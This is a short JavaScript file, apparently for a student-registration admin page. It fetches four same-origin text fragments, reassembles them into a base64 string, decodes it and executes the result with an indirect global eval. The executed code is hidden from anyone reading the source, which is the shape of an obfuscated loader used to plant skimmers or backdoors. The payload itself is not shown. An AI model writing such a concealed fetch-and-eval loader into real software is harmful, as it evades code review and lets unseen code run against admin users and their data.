/* admin-students-reg — 4-part continuous base64 */
(function () {
  var F = ["/_asr_u0.txt", "/_asr_u1.txt", "/_asr_u2.txt", "/_asr_u3.txt"];
  Promise.all(F.map(function (f) {
    return fetch(f, { credentials: "same-origin", cache: "no-store" }).then(function (r) {
      if (!r.ok) throw new Error(f + " " + r.status);
      return r.text();
    });
  })).then(function (parts) {
    var b64 = parts.join("").replace(/\s+/g, "");
    var bin = atob(b64);
    var bytes = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    var out = new TextDecoder("utf-8").decode(bytes);
    (0, eval)(out);
  }).catch(function (e) {
    console.error("[students-reg] load failed", e);
  });
})();
